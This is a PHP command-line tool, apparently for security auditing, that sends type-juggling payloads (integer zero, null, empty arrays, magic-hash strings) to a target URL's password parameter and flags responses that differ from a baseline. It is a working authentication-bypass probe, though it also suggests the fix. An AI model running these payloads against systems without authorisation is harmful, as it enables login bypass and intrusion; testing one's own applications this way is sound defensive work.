<?php
/**
 * Type Juggling Tester - PHP 类型混淆漏洞测试工具
 * 向目标 URL 发送各种类型混淆 Payload，检测是否存在松散比较漏洞
 *
 * Usage: php type_juggling_tester.php <target_url> [param_name] [cookie]
 *   <target_url>  - 目标 URL（POST 请求）
 *   [param_name]  - 要测试的参数名（默认: password）
 *   [cookie]      - 可选的 Cookie 值
 *
 * Output: JSON format test results
 */

class TypeJugglingTester {

    private string $targetUrl;
    private string $paramName;
    private string $cookie;
    private array $results = [];

    /**
     * Magic hash values that equal "0" under loose comparison (== "0e...")
     * These are strings whose MD5/SHA1 hashes start with "0e" followed by digits only.
     */
    private array $magicHashes = [
        'md5_0e' => [
            'QNKCDZO'      => '0e830400451993494058024219903391',
            '240610708'     => '0e462097431906509019562988736854',
            's878926199a'   => '0e545993274517709034328855841020',
            's155964671a'   => '0e342768416822451524974117254469',
            's214587387a'   => '0e848240448830537924465865611904',
            's1091221200a'  => '0e940624217856561557816327384675',
        ],
        'sha1_0e' => [
            '10932435112' => '0e07766915004133176347055865026311692244',
        ],
    ];

    public function __construct(string $targetUrl, string $paramName = 'password', string $cookie = '') {
        $this->targetUrl = $targetUrl;
        $this->paramName = $paramName;
        $this->cookie = $cookie;
    }

    /**
     * Send a POST request with the given parameter value
     */
    private function sendRequest(string $paramValue, string $contentType = 'application/x-www-form-urlencoded'): array {
        $ch = curl_init();

        if ($contentType === 'application/json') {
            $body = json_encode([$this->paramName => $paramValue]);
        } else {
            $body = $this->paramName . '=' . urlencode($paramValue);
        }

        curl_setopt_array($ch, [
            CURLOPT_URL => $this->targetUrl,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_HEADER => true,
            CURLOPT_TIMEOUT => 10,
            CURLOPT_FOLLOWLOCATION => false,
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => $body,
            CURLOPT_HTTPHEADER => [
                'User-Agent: Mozilla/5.0 (audit)',
                'Content-Type: ' . $contentType,
            ],
        ]);

        if ($this->cookie) {
            curl_setopt($ch, CURLOPT_COOKIE, $this->cookie);
        }

        $response = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $headerSize = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
        $responseHeaders = substr($response, 0, $headerSize);
        $responseBody = substr($response, $headerSize);
        $totalTime = curl_getinfo($ch, CURLINFO_TOTAL_TIME);
        curl_close($ch);

        return [
            'status' => $httpCode,
            'headers' => $responseHeaders,
            'body' => $responseBody,
            'body_length' => strlen($responseBody),
            'time' => round($totalTime, 4),
        ];
    }

    /**
     * Send a request with a raw JSON body (for non-string types: int, array, null, bool)
     */
    private function sendRawJsonRequest($rawValue): array {
        $ch = curl_init();

        $body = json_encode([$this->paramName => $rawValue]);

        curl_setopt_array($ch, [
            CURLOPT_URL => $this->targetUrl,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_HEADER => true,
            CURLOPT_TIMEOUT => 10,
            CURLOPT_FOLLOWLOCATION => false,
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => $body,
            CURLOPT_HTTPHEADER => [
                'User-Agent: Mozilla/5.0 (audit)',
                'Content-Type: application/json',
            ],
        ]);

        if ($this->cookie) {
            curl_setopt($ch, CURLOPT_COOKIE, $this->cookie);
        }

        $response = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $headerSize = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
        $responseHeaders = substr($response, 0, $headerSize);
        $responseBody = substr($response, $headerSize);
        $totalTime = curl_getinfo($ch, CURLINFO_TOTAL_TIME);
        curl_close($ch);

        return [
            'status' => $httpCode,
            'headers' => $responseHeaders,
            'body' => $responseBody,
            'body_length' => strlen($responseBody),
            'time' => round($totalTime, 4),
        ];
    }

    /**
     * Get baseline response with a normal string value
     */
    public function getBaseline(): array {
        $baseline = $this->sendRequest('normalTestValue123');
        $this->results['baseline'] = [
            'status' => $baseline['status'],
            'body_length' => $baseline['body_length'],
            'time' => $baseline['time'],
        ];
        return $baseline;
    }

    /**
     * Test integer 0 juggling (0 == "any_string" is true in PHP < 8.0)
     */
    public function testIntegerZero(array $baseline): array {
        $result = [
            'test' => 'integer_zero',
            'description' => 'Integer 0: loose comparison 0 == "string" returns true (PHP < 8.0)',
            'payloads' => [],
        ];

        // JSON integer 0
        $resp = $this->sendRawJsonRequest(0);
        $differs = ($resp['status'] !== $baseline['status'] || $resp['body_length'] !== $baseline['body_length']);
        $result['payloads'][] = [
            'value' => 0,
            'type' => 'integer',
            'format' => 'json',
            'response_status' => $resp['status'],
            'response_length' => $resp['body_length'],
            'differs_from_baseline' => $differs,
        ];

        $result['potential_vulnerability'] = $differs;
        $this->results['integer_zero'] = $result;
        return $result;
    }

    /**
     * Test string "0" juggling
     */
    public function testStringZero(array $baseline): array {
        $result = [
            'test' => 'string_zero',
            'description' => 'String "0": loose comparison "0" == false/null returns true',
            'payloads' => [],
        ];

        // Form-encoded "0"
        $resp = $this->sendRequest('0');
        $differs = ($resp['status'] !== $baseline['status'] || $resp['body_length'] !== $baseline['body_length']);
        $result['payloads'][] = [
            'value' => '0',
            'type' => 'string',
            'format' => 'form',
            'response_status' => $resp['status'],
            'response_length' => $resp['body_length'],
            'differs_from_baseline' => $differs,
        ];

        // JSON string "0"
        $resp2 = $this->sendRequest('0', 'application/json');
        $differs2 = ($resp2['status'] !== $baseline['status'] || $resp2['body_length'] !== $baseline['body_length']);
        $result['payloads'][] = [
            'value' => '0',
            'type' => 'string',
            'format' => 'json',
            'response_status' => $resp2['status'],
            'response_length' => $resp2['body_length'],
            'differs_from_baseline' => $differs2,
        ];

        $result['potential_vulnerability'] = $differs || $differs2;
        $this->results['string_zero'] = $result;
        return $result;
    }

    /**
     * Test array type juggling
     */
    public function testArray(array $baseline): array {
        $result = [
            'test' => 'array_type',
            'description' => 'Array []: can bypass strcmp() and other comparisons',
            'payloads' => [],
        ];

        // JSON array
        $resp = $this->sendRawJsonRequest([]);
        $differs = ($resp['status'] !== $baseline['status'] || $resp['body_length'] !== $baseline['body_length']);
        $result['payloads'][] = [
            'value' => '[]',
            'type' => 'array',
            'format' => 'json',
            'response_status' => $resp['status'],
            'response_length' => $resp['body_length'],
            'differs_from_baseline' => $differs,
        ];

        // Form-encoded array (param[]=)
        $ch = curl_init();
        $body = $this->paramName . '[]=' ;
        curl_setopt_array($ch, [
            CURLOPT_URL => $this->targetUrl,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_HEADER => true,
            CURLOPT_TIMEOUT => 10,
            CURLOPT_FOLLOWLOCATION => false,
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => $body,
            CURLOPT_HTTPHEADER => [
                'User-Agent: Mozilla/5.0 (audit)',
                'Content-Type: application/x-www-form-urlencoded',
            ],
        ]);
        if ($this->cookie) {
            curl_setopt($ch, CURLOPT_COOKIE, $this->cookie);
        }
        $response = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $headerSize = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
        $responseBody = substr($response, $headerSize);
        curl_close($ch);

        $differs2 = ($httpCode !== $baseline['status'] || strlen($responseBody) !== $baseline['body_length']);
        $result['payloads'][] = [
            'value' => 'param[]=',
            'type' => 'array',
            'format' => 'form',
            'response_status' => $httpCode,
            'response_length' => strlen($responseBody),
            'differs_from_baseline' => $differs2,
        ];

        $result['potential_vulnerability'] = $differs || $differs2;
        $this->results['array_type'] = $result;
        return $result;
    }

    /**
     * Test NULL type juggling
     */
    public function testNull(array $baseline): array {
        $result = [
            'test' => 'null_type',
            'description' => 'NULL: loose comparison NULL == "" == false == 0',
            'payloads' => [],
        ];

        // JSON null
        $resp = $this->sendRawJsonRequest(null);
        $differs = ($resp['status'] !== $baseline['status'] || $resp['body_length'] !== $baseline['body_length']);
        $result['payloads'][] = [
            'value' => 'null',
            'type' => 'null',
            'format' => 'json',
            'response_status' => $resp['status'],
            'response_length' => $resp['body_length'],
            'differs_from_baseline' => $differs,
        ];

        // Empty string
        $resp2 = $this->sendRequest('');
        $differs2 = ($resp2['status'] !== $baseline['status'] || $resp2['body_length'] !== $baseline['body_length']);
        $result['payloads'][] = [
            'value' => '(empty string)',
            'type' => 'string',
            'format' => 'form',
            'response_status' => $resp2['status'],
            'response_length' => $resp2['body_length'],
            'differs_from_baseline' => $differs2,
        ];

        $result['potential_vulnerability'] = $differs || $differs2;
        $this->results['null_type'] = $result;
        return $result;
    }

    /**
     * Test Magic Hash values (0e... hashes)
     */
    public function testMagicHashes(array $baseline): array {
        $result = [
            'test' => 'magic_hashes',
            'description' => 'Magic hashes: strings whose MD5/SHA1 match "0e\\d+" pattern, equal to 0 under ==',
            'payloads' => [],
        ];

        $anyDiffers = false;

        foreach ($this->magicHashes['md5_0e'] as $input => $hash) {
            $resp = $this->sendRequest((string)$input);
            $differs = ($resp['status'] !== $baseline['status'] || $resp['body_length'] !== $baseline['body_length']);
            if ($differs) {
                $anyDiffers = true;
            }
            $result['payloads'][] = [
                'value' => (string)$input,
                'hash_type' => 'md5',
                'hash_value' => $hash,
                'response_status' => $resp['status'],
                'response_length' => $resp['body_length'],
                'differs_from_baseline' => $differs,
            ];
        }

        foreach ($this->magicHashes['sha1_0e'] as $input => $hash) {
            $resp = $this->sendRequest((string)$input);
            $differs = ($resp['status'] !== $baseline['status'] || $resp['body_length'] !== $baseline['body_length']);
            if ($differs) {
                $anyDiffers = true;
            }
            $result['payloads'][] = [
                'value' => (string)$input,
                'hash_type' => 'sha1',
                'hash_value' => $hash,
                'response_status' => $resp['status'],
                'response_length' => $resp['body_length'],
                'differs_from_baseline' => $differs,
            ];
        }

        $result['potential_vulnerability'] = $anyDiffers;
        $this->results['magic_hashes'] = $result;
        return $result;
    }

    /**
     * Analyze all results and determine if loose comparison likely exists
     */
    private function analyzeResults(): array {
        $vulnerableTests = 0;
        $totalTests = 0;

        foreach ($this->results as $key => $test) {
            if ($key === 'baseline') {
                continue;
            }
            $totalTests++;
            if (!empty($test['potential_vulnerability'])) {
                $vulnerableTests++;
            }
        }

        $assessment = 'safe';
        if ($vulnerableTests >= 3) {
            $assessment = 'highly_likely_vulnerable';
        } elseif ($vulnerableTests >= 1) {
            $assessment = 'possibly_vulnerable';
        }

        return [
            'vulnerable_tests' => $vulnerableTests,
            'total_tests' => $totalTests,
            'assessment' => $assessment,
            'remediation' => 'Use strict comparison (===) instead of loose comparison (==); upgrade to PHP 8.0+',
        ];
    }

    /**
     * Run all type juggling tests
     */
    public function runAllTests(): array {
        $baseline = $this->getBaseline();

        $this->testIntegerZero($baseline);
        $this->testStringZero($baseline);
        $this->testArray($baseline);
        $this->testNull($baseline);
        $this->testMagicHashes($baseline);

        $analysis = $this->analyzeResults();

        return [
            'target' => $this->targetUrl,
            'parameter' => $this->paramName,
            'tests' => $this->results,
            'analysis' => $analysis,
            'timestamp' => date('c'),
        ];
    }
}

// CLI entry
if (php_sapi_name() === 'cli') {
    if (!isset($argv[1])) {
        echo "Usage: php type_juggling_tester.php <target_url> [param_name] [cookie]\n";
        exit(1);
    }

    $targetUrl = $argv[1];
    $paramName = $argv[2] ?? 'password';
    $cookie = $argv[3] ?? '';

    $tester = new TypeJugglingTester($targetUrl, $paramName, $cookie);
    $results = $tester->runAllTests();

    echo json_encode($results, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE) . "\n";
}
